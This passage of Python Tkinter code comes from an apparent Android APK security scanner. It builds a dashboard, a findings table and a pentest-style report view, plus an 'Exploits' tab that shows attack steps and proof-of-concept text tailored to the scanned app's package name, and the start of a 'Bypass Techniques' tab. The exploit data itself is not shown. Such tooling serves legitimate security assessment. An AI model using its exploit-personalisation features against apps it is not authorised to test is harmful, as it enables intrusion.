    # ══════════════════════════════════════════════════════════
    #  TAB 0: DASHBOARD (Enterprise Grade)
    # ══════════════════════════════════════════════════════════
    dash_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    dash_inner = tk.Frame(dash_canvas, bg=BG)
    dash_sb = ttk.Scrollbar(dash_canvas, orient="vertical", command=dash_canvas.yview)
    dash_canvas.configure(yscrollcommand=dash_sb.set)
    dash_sb.pack(side="right", fill="y")
    dash_canvas.pack(fill="both", expand=True)
    dash_cw = dash_canvas.create_window((0, 0), window=dash_inner, anchor="nw")
    dash_inner.bind("<Configure>", lambda e: dash_canvas.configure(scrollregion=dash_canvas.bbox("all")))
    dash_canvas.bind("<Configure>", lambda e: dash_canvas.itemconfig(dash_cw, width=e.width))
    # Mouse wheel scroll - registered globally
    _register_scrollable(0, dash_canvas, dash_inner)
    nb.add(dash_canvas, text=" \U0001f4ca Dashboard ")

    def _build_dashboard(par, fi, sc):
        PAD = 24
        # Title row
        title_row = tk.Frame(par, bg=BG)
        title_row.pack(fill="x", padx=PAD, pady=(PAD, 4))
        tk.Label(title_row, text="Android Application Security Dashboard",
                 font=(FONT, 20, "bold"), bg=BG, fg="#ffffff", anchor="w").pack(side="left")
        if state["apk"]:
            tk.Label(title_row, text=state["apk"],
                     font=(MONO, 11), bg=BG, fg=FG2, anchor="e").pack(side="right")

        if not fi:
            # Empty state
            empty = make_card(par, px=40, py=60)
            empty.pack(fill="x", padx=PAD, pady=40)
            tk.Label(empty, text="\U0001f4f1", font=(FONT, 48), bg=BG_CARD, fg=FG3).pack()
            tk.Label(empty, text="No Scan Results", font=(FONT, 18, "bold"), bg=BG_CARD, fg=FG).pack(pady=(12, 4))
            tk.Label(empty, text="Open an APK file and click Scan to begin the security assessment.",
                     font=(FONT, 12), bg=BG_CARD, fg=FG2).pack()
            return

        tk.Frame(par, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(8, 16))

        # ── Risk Score Section ──
        risk_row = tk.Frame(par, bg=BG)
        risk_row.pack(fill="x", padx=PAD, pady=(0, 12))

        total_cvss = sum(f.cvss for f in fi if isinstance(f.cvss, (int, float)))
        avg = total_cvss / max(len(fi), 1)
        risk = "CRITICAL" if avg >= 9 else "HIGH" if avg >= 7 else "MEDIUM" if avg >= 4 else "LOW"
        risk_col = SEVC.get(risk, FG)

        risk_card = make_card(risk_row, px=24, py=16)
        risk_card.pack(side="left", fill="x", expand=True, padx=(0, 8))
        r_top = tk.Frame(risk_card, bg=BG_CARD)
        r_top.pack(fill="x")
        tk.Label(r_top, text="RISK SCORE", font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG3, anchor="w").pack(side="left")
        tk.Label(r_top, text=risk, font=(FONT, 11, "bold"), bg=BG_CARD, fg=risk_col, anchor="e").pack(side="right")
        tk.Label(risk_card, text="{:.1f}".format(avg), font=(MONO, 36, "bold"), bg=BG_CARD, fg=risk_col, anchor="w").pack(anchor="w")
        tk.Label(risk_card, text="/ 10.0  avg CVSS across {} findings".format(len(fi)),
                 font=(FONT, 10), bg=BG_CARD, fg=FG2, anchor="w").pack(anchor="w")

        total_card = make_card(risk_row, px=24, py=16)
        total_card.pack(side="left", fill="x", expand=True, padx=8)
        tk.Label(total_card, text="TOTAL FINDINGS", font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG3, anchor="w").pack(anchor="w")
        tk.Label(total_card, text=str(len(fi)), font=(MONO, 36, "bold"), bg=BG_CARD, fg=ACC, anchor="w").pack(anchor="w")
        taint_n = sum(1 for f in fi if f.id.startswith("AV-TAINT"))
        tk.Label(total_card, text="incl. {} taint flow detections".format(taint_n),
                 font=(FONT, 10), bg=BG_CARD, fg=FG2, anchor="w").pack(anchor="w")

        files_card = make_card(risk_row, px=24, py=16)
        files_card.pack(side="left", fill="x", expand=True, padx=(8, 0))
        tk.Label(files_card, text="FILES ANALYZED", font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG3, anchor="w").pack(anchor="w")
        tk.Label(files_card, text=str(len(state["files"])), font=(MONO, 36, "bold"), bg=BG_CARD, fg=GREEN, anchor="w").pack(anchor="w")
        tk.Label(files_card, text="files extracted from APK",
                 font=(FONT, 10), bg=BG_CARD, fg=FG2, anchor="w").pack(anchor="w")

        # ── Severity Breakdown Cards ──
        sev_row = tk.Frame(par, bg=BG)
        sev_row.pack(fill="x", padx=PAD, pady=(0, 16))
        sev_labels = [("CRITICAL", RED, "\u26d4"), ("HIGH", ORANGE, "\U0001f534"),
                      ("MEDIUM", YELLOW, "\U0001f7e1"), ("LOW", ACC, "\U0001f535"), ("INFO", FG2, "\u2139\ufe0f")]
        for sev_name, sev_color, icon in sev_labels:
            cnt = sc.get(sev_name, 0)
            card = make_card(sev_row, px=0, py=12)
            card.pack(side="left", fill="x", expand=True, padx=4)
            inner = tk.Frame(card, bg=BG_CARD)
            inner.pack(fill="x", padx=16)
            # Color accent bar on top
            tk.Frame(card, bg=sev_color, height=3).place(x=0, y=0, relwidth=1.0)
            tk.Label(inner, text=str(cnt), font=(MONO, 28, "bold"), bg=BG_CARD, fg=sev_color, anchor="center").pack()
            tk.Label(inner, text=sev_name, font=(FONT, 9, "bold"), bg=BG_CARD, fg=FG2, anchor="center").pack()

        # ── Android Components Card ──
        comps = _extract_android_components(state["files"])
        comp_card = make_card(par, px=20, py=16)
        comp_card.pack(fill="x", padx=PAD, pady=(0, 16))
        ncomp = len(comps["activities"])+len(comps["services"])+len(comps["receivers"])+len(comps["providers"])
        tk.Label(comp_card, text="ANDROID COMPONENTS ({})".format(ncomp), font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 8))
        if comps["package"]:
            tk.Label(comp_card, text="Package: {}  |  Min SDK: {}  |  Target SDK: {}".format(
                comps["package"], comps.get("min_sdk","?"), comps.get("target_sdk","?")),
                font=(MONO, 10), bg=BG_CARD, fg=FG2, anchor="w").pack(fill="x", pady=(0, 8))
        comp_info = tk.Frame(comp_card, bg=BG_CARD)
        comp_info.pack(fill="x")
        for lbl, lst, col in [("Activities", comps["activities"], GREEN), ("Services", comps["services"], ACC),
                               ("Receivers", comps["receivers"], ORANGE), ("Providers", comps["providers"], PURPLE)]:
            cf = tk.Frame(comp_info, bg=BG3, padx=12, pady=6)
            cf.pack(side="left", padx=(0, 8), fill="x", expand=True)
            tk.Label(cf, text=str(len(lst)), font=(MONO, 20, "bold"), bg=BG3, fg=col).pack()
            tk.Label(cf, text=lbl, font=(FONT, 9), bg=BG3, fg=FG2).pack()
        # Permissions count
        pf = tk.Frame(comp_info, bg=BG3, padx=12, pady=6)
        pf.pack(side="left", fill="x", expand=True)
        tk.Label(pf, text=str(len(comps["permissions"])), font=(MONO, 20, "bold"), bg=BG3, fg=YELLOW).pack()
        tk.Label(pf, text="Permissions", font=(FONT, 9), bg=BG3, fg=FG2).pack()

        # ── Charts Row: Pie + Bar ──
        chart_row = tk.Frame(par, bg=BG)
        chart_row.pack(fill="x", padx=PAD, pady=(0, 16))

        # Pie Chart
        pie_card = make_card(chart_row, px=12, py=12)
        pie_card.pack(side="left", fill="both", expand=True, padx=(0, 8))
        tk.Label(pie_card, text="SEVERITY DISTRIBUTION", font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 8))
        pie_cv = tk.Canvas(pie_card, width=280, height=220, bg=BG_CARD, highlightthickness=0)
        pie_cv.pack()
        total_f = sum(sc.values())
        if total_f > 0:
            cx, cy, r = 140, 110, 85
            start_angle = 0
            sev_colors_pie = [("CRITICAL", RED), ("HIGH", ORANGE), ("MEDIUM", YELLOW), ("LOW", ACC), ("INFO", FG2)]
            for sev_name, sev_col in sev_colors_pie:
                cnt = sc.get(sev_name, 0)
                if cnt == 0: continue
                extent = (cnt / total_f) * 360
                pie_cv.create_arc(cx-r, cy-r, cx+r, cy+r, start=start_angle, extent=extent,
                                  fill=sev_col, outline=BG_CARD, width=2)
                # Label
                mid = math.radians(start_angle + extent/2)
                lx = cx + (r+25) * math.cos(mid)
                ly = cy - (r+25) * math.sin(mid)
                pie_cv.create_text(lx, ly, text="{}: {}".format(sev_name[:4], cnt),
                                   fill=FG2, font=(FONT, 8))
                start_angle += extent

        # Bar Chart (OWASP categories)
        bar_card = make_card(chart_row, px=12, py=12)
        bar_card.pack(side="left", fill="both", expand=True, padx=(8, 0))
        tk.Label(bar_card, text="OWASP CATEGORY ANALYSIS", font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 8))
        bar_cv = tk.Canvas(bar_card, width=350, height=220, bg=BG_CARD, highlightthickness=0)
        bar_cv.pack()
        cats_bar = {}
        for f in fi:
            cat = f.id.split("-")[1] if "-" in f.id else "OTH"
            cats_bar[cat] = cats_bar.get(cat, 0) + 1
        cat_nm = {"MAN":"Manifest","CRY":"Crypto","SEC":"Secrets","NET":"Network","PLT":"Platform",
                  "INJ":"Injection","RES":"Resilience","PRV":"Privacy","CLD":"Cloud","AUT":"Auth",
                  "WEB":"Web","OTH":"Other","TAINT":"Taint"}
        cat_cl = {"MAN":ORANGE,"CRY":RED,"SEC":RED,"NET":ORANGE,"PLT":YELLOW,"INJ":RED,
                  "RES":ACC,"PRV":PURPLE,"CLD":ORANGE,"AUT":ORANGE,"WEB":RED,"OTH":FG2,"TAINT":RED}
        if cats_bar:
            sorted_cats = sorted(cats_bar.items(), key=lambda x:-x[1])[:10]
            mx_val = max(v for _,v in sorted_cats)
            bh = 16; by = 10
            for i, (cat, cnt) in enumerate(sorted_cats):
                y_pos = by + i * (bh + 4)
                bw = int((cnt / mx_val) * 200)
                bar_cv.create_text(5, y_pos + bh//2, text=cat_nm.get(cat, cat), anchor="w",
                                   fill=FG2, font=(FONT, 8))
                bar_cv.create_rectangle(75, y_pos, 75+bw, y_pos+bh,
                                        fill=cat_cl.get(cat, ACC), outline="")
                bar_cv.create_text(80+bw, y_pos + bh//2, text=str(cnt), anchor="w",
                                   fill=FG2, font=(MONO, 9, "bold"))

        # ── Two-column layout: Categories + Top Findings ──
        cols_row = tk.Frame(par, bg=BG)
        cols_row.pack(fill="x", padx=PAD, pady=(0, 16))

        # Left column: Category Breakdown
        cat_card = make_card(cols_row, px=20, py=16)
        cat_card.pack(side="left", fill="both", expand=True, padx=(0, 8))
        tk.Label(cat_card, text="CATEGORY BREAKDOWN", font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 12))

        cats = {}
        for f in fi:
            cat = f.id.split("-")[1] if "-" in f.id else "OTH"
            cats[cat] = cats.get(cat, 0) + 1
        cat_names = {"MAN": "Manifest", "CRY": "Cryptography", "SEC": "Secrets & Storage",
                     "NET": "Network Security", "PLT": "Platform", "INJ": "Injection",
                     "RES": "Resilience", "PRV": "Privacy", "CLD": "Cloud Config",
                     "AUT": "Authentication", "WEB": "Web Security", "OTH": "Other",
                     "TAINT": "Taint Analysis"}
        max_cat = max(cats.values()) if cats else 1
        for cat, cnt in sorted(cats.items(), key=lambda x: -x[1]):
            row = tk.Frame(cat_card, bg=BG_CARD)
            row.pack(fill="x", pady=3)
            name = cat_names.get(cat, cat)
            tk.Label(row, text=name, font=(FONT, 10), bg=BG_CARD, fg=FG,
                     anchor="w", width=18).pack(side="left")
            bar_frame = tk.Frame(row, bg=BG3, height=16)
            bar_frame.pack(side="left", fill="x", expand=True, padx=(4, 8))
            bar_frame.pack_propagate(False)
            bar_pct = cnt / max_cat
            colors = {
                "MAN": ORANGE, "CRY": RED, "SEC": RED, "NET": ORANGE,
                "PLT": YELLOW, "INJ": RED, "RES": ACC, "PRV": PURPLE,
                "CLD": ORANGE, "AUT": ORANGE, "WEB": RED, "OTH": FG2, "TAINT": RED
            }
            bar = tk.Frame(bar_frame, bg=colors.get(cat, ACC), height=16)
            bar.place(x=0, y=0, relwidth=bar_pct, relheight=1.0)
            tk.Label(row, text=str(cnt), font=(MONO, 10, "bold"), bg=BG_CARD, fg=FG2,
                     width=4, anchor="e").pack(side="right")

        # Right column: Top Findings
        top_card = make_card(cols_row, px=20, py=16)
        top_card.pack(side="left", fill="both", expand=True, padx=(8, 0))
        tk.Label(top_card, text="TOP FINDINGS (by severity)", font=(FONT, 10, "bold"),
                 bg=BG_CARD, fg=FG3, anchor="w").pack(fill="x", pady=(0, 12))

        for i, f in enumerate(fi[:15]):
            row = tk.Frame(top_card, bg=BG_CARD if i % 2 == 0 else BG3)
            row.pack(fill="x", pady=1)
            rbg = BG_CARD if i % 2 == 0 else BG3
            # Severity badge
            badge = tk.Label(row, text=" {} ".format(f.severity[:4]),
                             font=(MONO, 8, "bold"), bg=SEVC.get(f.severity, FG2),
                             fg="#000000" if f.severity in ("MEDIUM", "LOW") else "#ffffff",
                             anchor="center", width=6)
            badge.pack(side="left", padx=(4, 8), pady=2)
            tk.Label(row, text=f.title, font=(FONT, 10), bg=rbg, fg=FG, anchor="w").pack(side="left", fill="x", expand=True)
            tk.Label(row, text="{}:{}".format(f.file.split("/")[-1] if "/" in f.file else f.file, f.line), font=(MONO, 9), bg=rbg, fg=FG3, anchor="e").pack(side="right", padx=4)

        # ── Taint Flow Section ──
        taint = [f for f in fi if f.id.startswith("AV-TAINT")]
        if taint:
            taint_card = make_card(par, px=20, py=16)
            taint_card.pack(fill="x", padx=PAD, pady=(0, 16))
            tk.Label(taint_card, text="\u26a0\ufe0f  TAINT FLOW ANALYSIS  ({} flows detected)".format(len(taint)),
                     font=(FONT, 11, "bold"), bg=BG_CARD, fg=RED, anchor="w").pack(fill="x", pady=(0, 12))
            for i, f in enumerate(taint[:12]):
                row = tk.Frame(taint_card, bg=BG_CARD if i % 2 == 0 else BG3)
                row.pack(fill="x", pady=1)
                rbg = BG_CARD if i % 2 == 0 else BG3
                tk.Label(row, text=" TAINT ", font=(MONO, 8, "bold"), bg=RED, fg="#ffffff",
                         anchor="center", width=6).pack(side="left", padx=(4, 8), pady=2)
                tk.Label(row, text=f.title, font=(FONT, 10), bg=rbg, fg=FG, anchor="w").pack(side="left", fill="x", expand=True)
                tk.Label(row, text="L:{}".format(f.line), font=(MONO, 9), bg=rbg, fg=FG3).pack(side="right", padx=4)

        # Footer
        tk.Frame(par, bg=BORDER, height=1).pack(fill="x", padx=PAD, pady=(8, 4))
        tk.Label(par, text="{} v{}  |  {} rules + taint engine  |  {} findings".format(
            APP_NAME, VERSION, len(RULES), len(fi)),
            font=(FONT, 9), bg=BG, fg=FG3, anchor="center").pack(pady=(0, PAD))


    _build_dashboard(dash_inner, [], {})

    # ══════════════════════════════════════════════════════════
    #  TAB 1: FINDINGS TABLE
    # ══════════════════════════════════════════════════════════
    findings_frame = tk.Frame(nb, bg=BG)
    # Search / filter bar
    filter_bar = tk.Frame(findings_frame, bg=BG2, height=40)
    filter_bar.pack(fill="x")
    filter_bar.pack_propagate(False)
    tk.Label(filter_bar, text="  \U0001f50d", font=(FONT, 12), bg=BG2, fg=FG2).pack(side="left")
    filter_var = tk.StringVar()
    filter_entry = tk.Entry(filter_bar, textvariable=filter_var, bg=BG3, fg=FG,
                            insertbackground=FG, font=(FONT, 11), bd=0, relief="flat")
    filter_entry.pack(side="left", fill="x", expand=True, padx=8, pady=8)
    filter_entry.insert(0, "Filter findings...")
    def _on_filter_focus_in(e):
        if filter_entry.get() == "Filter findings...":
            filter_entry.delete(0, "end")
    def _on_filter_focus_out(e):
        if not filter_entry.get():
            filter_entry.insert(0, "Filter findings...")
    filter_entry.bind("<FocusIn>", _on_filter_focus_in)
    filter_entry.bind("<FocusOut>", _on_filter_focus_out)
    def _on_filter_change(*a):
        q = filter_var.get().lower()
        if q == "filter findings...": q = ""
        ftree.delete(*ftree.get_children())
        for i, f in enumerate(state["findings"]):
            # Search in all locations too
            loc_match = any(q in loc[0].lower() for loc in (f.locations or [])) if q else False
            if q and q not in f.title.lower() and q not in f.id.lower() and q not in f.severity.lower() and q not in f.file.lower() and not loc_match:
                continue
            tag = "even" if i % 2 == 0 else "odd"
            hits = len(f.locations) if f.locations else 1
            short_file = f.file.split("/")[-1] if "/" in f.file else f.file
            loc_display = short_file if hits == 1 else "{} (+{} more)".format(short_file, hits - 1)
            ftree.insert("", "end", values=(f.id, f.severity, f.title, f.cwe, hits, loc_display, f.line, f.cvss), tags=(tag,))
    filter_var.trace_add("write", _on_filter_change)

    # Treeview
    cols = ("ID", "Severity", "Title", "CWE", "Hits", "File", "Line", "CVSS")
    ftree = ttk.Treeview(findings_frame, columns=cols, show="headings", height=30)
    ftree.tag_configure("even", background=BG2)
    ftree.tag_configure("odd", background=BG3)
    col_widths = {"ID": 100, "Severity": 80, "Title": 250, "CWE": 80, "Hits": 40, "File": 290, "Line": 50, "CVSS": 55}
    for c in cols:
        ftree.heading(c, text=c, anchor="w")
        ftree.column(c, width=col_widths.get(c, 80), minwidth=30, anchor="w")
    f_sb = ttk.Scrollbar(findings_frame, orient="vertical", command=ftree.yview)
    ftree.configure(yscrollcommand=f_sb.set)
    f_sb.pack(side="right", fill="y")
    ftree.pack(fill="both", expand=True)

    def on_finding_click(e):
        s = ftree.selection()
        if not s: return
        v = ftree.item(s[0], "values")
        for f in state["findings"]:
            if f.id == v[0]:
                dt.configure(state="normal"); dt.delete("1.0", "end")
                locs = f.locations if f.locations else [(f.file, f.line, f.evidence)]
                hits = len(locs)
                # Professional pentest-style report
                dt.insert("end", "\n")
                dt.insert("end", "  \u2588\u2588 SECURITY FINDING REPORT\n", "heading")
                dt.insert("end", "  " + "\u2500" * 60 + "\n\n", "border")
                # Risk rating box
                risk_label = {"CRITICAL":"CRITICAL RISK","HIGH":"HIGH RISK","MEDIUM":"MEDIUM RISK","LOW":"LOW RISK","INFO":"INFORMATIONAL"}.get(f.severity,"")
                dt.insert("end", "  [{} | CVSS {}/10.0]\n\n".format(risk_label, f.cvss), "evidence")
                # Summary
                dt.insert("end", "  1. VULNERABILITY SUMMARY\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                dt.insert("end", "  Title:       {}\n".format(f.title), "field_value")
                dt.insert("end", "  ID:          {}\n".format(f.id), "field_label")
                dt.insert("end", "  Severity:    {}\n".format(f.severity), "field_value")
                dt.insert("end", "  CWE:         {} (https://cwe.mitre.org/data/definitions/{}.html)\n".format(f.cwe, f.cwe.split("-")[1] if "-" in f.cwe else ""), "field_label")
                dt.insert("end", "  OWASP:       {} (Mobile Top 10)\n".format(f.owasp), "field_label")
                dt.insert("end", "  CVSS 3.1:    {}/10.0\n".format(f.cvss), "field_label")
                dt.insert("end", "  Occurrences: {} location{}\n".format(hits, "s" if hits > 1 else ""), "field_value")
                dt.insert("end", "\n")
                # Description
                dt.insert("end", "  2. TECHNICAL DESCRIPTION\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                dt.insert("end", "  {}\n\n".format(f.desc), "desc_text")
                dt.insert("end", "  This vulnerability was identified through static analysis of the\n", "desc_text")
                dt.insert("end", "  application's decompiled source code. The affected code pattern\n", "desc_text")
                dt.insert("end", "  matches known insecure implementation ({}).\n\n".format(f.cwe), "desc_text")
                # Impact
                dt.insert("end", "  3. IMPACT ASSESSMENT\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                impacts = {"CRITICAL":"Complete compromise of application data and user accounts. An attacker can exploit this remotely without authentication.",
                           "HIGH":"Significant data exposure or unauthorized access. Exploitation requires minimal user interaction.",
                           "MEDIUM":"Partial information disclosure or limited unauthorized actions. Requires specific conditions to exploit.",
                           "LOW":"Minor information leak with limited security impact. Exploitation difficulty is high.",
                           "INFO":"Informational finding for security hardening. No direct exploit path."}
                dt.insert("end", "  {}\n\n".format(impacts.get(f.severity, "")), "desc_text")
                # Evidence — show ALL locations
                dt.insert("end", "  4. EVIDENCE / PROOF  ({} occurrence{})\n".format(hits, "s" if hits > 1 else ""), "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                for loc_idx, (loc_file, loc_line, loc_ev) in enumerate(locs):
                    short_f = loc_file.split("/")[-1] if "/" in loc_file else loc_file
                    dt.insert("end", "\n  \u25b6 Location {} of {}:\n".format(loc_idx + 1, hits), "field_value")
                    dt.insert("end", "    File: {}\n".format(loc_file), "field_label")
                    dt.insert("end", "    Line: {}\n".format(loc_line), "field_label")
                    dt.insert("end", "    Code:\n", "field_label")
                    dt.insert("end", "      >>> {}\n".format(loc_ev), "evidence")
                dt.insert("end", "\n")
                # Remediation
                dt.insert("end", "  5. REMEDIATION\n", "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                dt.insert("end", "  {}\n\n".format(f.fix), "fix_text")
                # Exploitation
                comps_ex = _extract_android_components(state["files"])
                _pkg = comps_ex.get("package", "") or ""
                _apk = state.get("apk", "") or ""
                for ex in EXPLOITS:
                    if any(kw.lower() in f.title.lower() for kw in ex["vuln"].split()):
                        dt.insert("end", "  6. EXPLOITATION (Red Team)\n", "section")
                        dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                        ex_cves = ex.get("cves", [])
                        if ex_cves:
                            dt.insert("end", "  Related CVEs: {}\n".format(" | ".join(ex_cves)), "evidence")
                        dt.insert("end", "  Tools: {}\n\n".format(ex["tool"]), "field_label")
                        dt.insert("end", "  Target: {}\n".format(_pkg if _pkg else _apk), "field_value")
                        dt.insert("end", "  APK: {}\n\n".format(_apk), "field_label")
                        steps_p = _personalize_exploit(ex["steps"], _pkg, _apk)
                        poc_p = _personalize_exploit(ex["poc"], _pkg, _apk)
                        dt.insert("end", "  Attack Steps:\n", "field_value")
                        dt.insert("end", "  " + steps_p.replace("\n", "\n  ") + "\n\n", "desc_text")
                        dt.insert("end", "  Proof of Concept:\n", "field_value")
                        dt.insert("end", "  " + poc_p.replace("\n", "\n  ") + "\n\n", "evidence")
                        break
                # Related CVEs from database
                finding_cves = get_cves_for_finding(f.title)
                if finding_cves:
                    dt.insert("end", "  7. RELATED CVEs ({} known vulnerabilities)\n".format(len(finding_cves)), "section")
                    dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                    for cve in finding_cves[:6]:
                        dt.insert("end", "  {} - {} [CVSS {:.1f} {}]\n".format(cve["id"], cve["name"], cve["cvss"], cve["sev"]), "evidence")
                        dt.insert("end", "    Affected: {}\n".format(cve["affected"]), "field_label")
                        dt.insert("end", "    {}\n".format(cve["desc"][:200]), "desc_text")
                        dt.insert("end", "    https://nvd.nist.gov/vuln/detail/{}\n\n".format(cve["id"]), "field_label")
                    ref_section_num = 8
                else:
                    ref_section_num = 7
                # References
                dt.insert("end", "  {}. REFERENCES\n".format(ref_section_num), "section")
                dt.insert("end", "  " + "\u2500" * 40 + "\n", "border")
                dt.insert("end", "  - {}: https://cwe.mitre.org/data/definitions/{}.html\n".format(f.cwe, f.cwe.split("-")[1] if "-" in f.cwe else ""), "field_label")
                dt.insert("end", "  - OWASP Mobile Top 10: https://owasp.org/www-project-mobile-top-10/\n", "field_label")
                dt.insert("end", "  - OWASP MASTG: https://mas.owasp.org/MASTG/\n", "field_label")
                dt.insert("end", "  - CVSS Calculator: https://www.first.org/cvss/calculator/3.1\n\n", "field_label")
                dt.insert("end", "  " + "\u2500" * 60 + "\n", "border")
                dt.insert("end", "  Report generated by {} v{}\n".format(APP_NAME, VERSION), "field_label")
                dt.configure(state="disabled")
                nb.select(detail_tab_idx)
                break
    ftree.bind("<<TreeviewSelect>>", on_finding_click)
    nb.add(findings_frame, text=" \U0001f6e1\ufe0f Findings ")

    # ══════════════════════════════════════════════════════════
    #  TAB 2: DETAIL VIEW
    # ══════════════════════════════════════════════════════════
    detail_frame = tk.Frame(nb, bg=BG)
    dt = scrolledtext.ScrolledText(detail_frame, wrap="word", bg=BG2, fg=FG,
                                    font=(MONO, 11), state="disabled", bd=0,
                                    padx=16, pady=16)
    dt.pack(fill="both", expand=True)
    dt.tag_configure("heading", foreground=ACC, font=(FONT, 16, "bold"))
    dt.tag_configure("border", foreground=BORDER)
    dt.tag_configure("section", foreground=ORANGE, font=(FONT, 12, "bold"))
    dt.tag_configure("field_label", foreground=FG2, font=(MONO, 11))
    dt.tag_configure("field_value", foreground=FG, font=(MONO, 11, "bold"))
    dt.tag_configure("evidence", foreground=YELLOW, font=(MONO, 10))
    dt.tag_configure("desc_text", foreground=FG, font=(FONT, 11))
    dt.tag_configure("fix_text", foreground=GREEN, font=(FONT, 11))
    nb.add(detail_frame, text=" \U0001f4cb Detail ")
    detail_tab_idx = 2

    # ══════════════════════════════════════════════════════════
    #  TAB 3: EXPLOITS (Structured Cards)
    # ══════════════════════════════════════════════════════════
    ex_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    ex_inner = tk.Frame(ex_canvas, bg=BG)
    ex_sb = ttk.Scrollbar(ex_canvas, orient="vertical", command=ex_canvas.yview)
    ex_canvas.configure(yscrollcommand=ex_sb.set)
    ex_sb.pack(side="right", fill="y"); ex_canvas.pack(fill="both", expand=True)
    ex_cw = ex_canvas.create_window((0, 0), window=ex_inner, anchor="nw")
    ex_inner.bind("<Configure>", lambda e: ex_canvas.configure(scrollregion=ex_canvas.bbox("all")))
    ex_canvas.bind("<Configure>", lambda e: ex_canvas.itemconfig(ex_cw, width=e.width))

    def _build_exploits_tab(parent, pkg_name="", apk_name=""):
        """Build exploit cards with personalized package names."""
        for w in parent.winfo_children():
            w.destroy()
        tk.Label(parent, text="Exploit Knowledge Base", font=(FONT, 18, "bold"),
                 bg=BG, fg="#ffffff", anchor="w").pack(fill="x", padx=24, pady=(24, 4))
        subtitle = "{} exploit techniques with tools, steps, and proof-of-concept code".format(len(EXPLOITS))
        if pkg_name:
            subtitle += "  |  Target: {}".format(pkg_name)
        tk.Label(parent, text=subtitle,
                 font=(FONT, 11), bg=BG, fg=FG2, anchor="w").pack(fill="x", padx=24, pady=(0, 16))
        tk.Frame(parent, bg=BORDER, height=1).pack(fill="x", padx=24, pady=(0, 8))

        for i, ex in enumerate(EXPLOITS):
            card = make_card(parent, px=20, py=16)
            card.pack(fill="x", padx=24, pady=6)
            # Header row
            hdr = tk.Frame(card, bg=BG_CARD)
            hdr.pack(fill="x", pady=(0, 8))
            tk.Label(hdr, text="{:02d}".format(i + 1), font=(MONO, 10, "bold"), bg=RED, fg="#ffffff",
                     padx=8, pady=2).pack(side="left", padx=(0, 10))
            tk.Label(hdr, text=ex["vuln"], font=(FONT, 13, "bold"), bg=BG_CARD, fg=FG, anchor="w").pack(side="left")
            tk.Label(hdr, text=ex["tool"], font=(MONO, 9), bg=BG_CARD, fg=FG2, anchor="e").pack(side="right")
            # CVE badges
            ex_cves = ex.get("cves", [])
            if ex_cves:
                cve_row = tk.Frame(card, bg=BG_CARD)
                cve_row.pack(fill="x", pady=(0, 4))
                for cid in ex_cves:
                    tk.Label(cve_row, text=cid, font=(MONO, 8, "bold"), bg="#7d1a1a", fg="#f85149",
                             padx=6, pady=1).pack(side="left", padx=(0, 6))
            # Target info
            if pkg_name:
                tk.Label(card, text="TARGET: {}".format(pkg_name), font=(MONO, 9, "bold"), bg=BG_CARD, fg=ACC, anchor="w").pack(fill="x", pady=(0, 4))
            # Steps - personalized
            steps_p = _personalize_exploit(ex["steps"], pkg_name, apk_name)
            tk.Label(card, text="ATTACK STEPS", font=(FONT, 9, "bold"), bg=BG_CARD, fg=ORANGE, anchor="w").pack(fill="x", pady=(4, 2))
            steps_text = tk.Text(card, bg=BG3, fg=FG, font=(MONO, 10), height=min(steps_p.count("\n") + 1, 8),
                                 bd=0, wrap="word", padx=10, pady=8)
            steps_text.pack(fill="x", pady=2)
            steps_text.insert("1.0", steps_p)
            steps_text.configure(state="disabled")
            # PoC - personalized
            poc_p = _personalize_exploit(ex["poc"], pkg_name, apk_name)
            tk.Label(card, text="PROOF OF CONCEPT", font=(FONT, 9, "bold"), bg=BG_CARD, fg=GREEN, anchor="w").pack(fill="x", pady=(8, 2))
            poc_text = tk.Text(card, bg=BG3, fg=YELLOW, font=(MONO, 10), height=min(poc_p.count("\n") + 1, 10),
                               bd=0, wrap="word", padx=10, pady=8)
            poc_text.pack(fill="x", pady=2)
            poc_text.insert("1.0", poc_p)
            poc_text.configure(state="disabled")

    _build_exploits_tab(ex_inner)
    nb.add(ex_canvas, text=" \U0001f4a3 Exploits ")
    _register_scrollable(3, ex_canvas, ex_inner)

    # ══════════════════════════════════════════════════════════
    #  TAB 4: BYPASS TECHNIQUES (Structured Cards)
    # ══════════════════════════════════════════════════════════
    by_canvas = tk.Canvas(nb, bg=BG, highlightthickness=0, bd=0)
    by_inner = tk.Frame(by_canvas, bg=BG)
    by_sb = ttk.Scrollbar(by_canvas, orient="vertical", command=by_canvas.yview)
    by_canvas.configure(yscrollcommand=by_sb.set)
    by_sb.pack(side="right", fill="y"); by_canvas.pack(fill="both", expand=True)
    by_cw = by_canvas.create_window((0, 0), window=by_inner, anchor="nw")
    by_inner.bind("<Configure>", lambda e: by_canvas.configure(scrollregion=by_canvas.bbox("all")))
    by_canvas.bind("<Configure>", lambda e: by_canvas.itemconfig(by_cw, width=e.width))

    tk.Label(by_inner, text="Bypass Techniques Reference", font=(FONT, 18, "bold"),
             bg=BG, fg="#ffffff", anchor="w").pack(fill="x", padx=24, pady=(24, 4))
    tk.Label(by_inner, text="{} techniques for bypassing Android security controls".format(len(BYPASS_TECHNIQUES)),
             font=(FONT, 11), bg=BG, fg=FG2, anchor="w").pack(fill="x", padx=24, pady=(0, 16))
    tk.Frame(by_inner, bg=BORDER, height=1).pack(fill="x", padx=24, pady=(0, 8))

    cat_colors = {"Network": ACC, "Resilience": PURPLE, "Auth": ORANGE, "Code": YELLOW, "Platform": GREEN, "UI": RED}
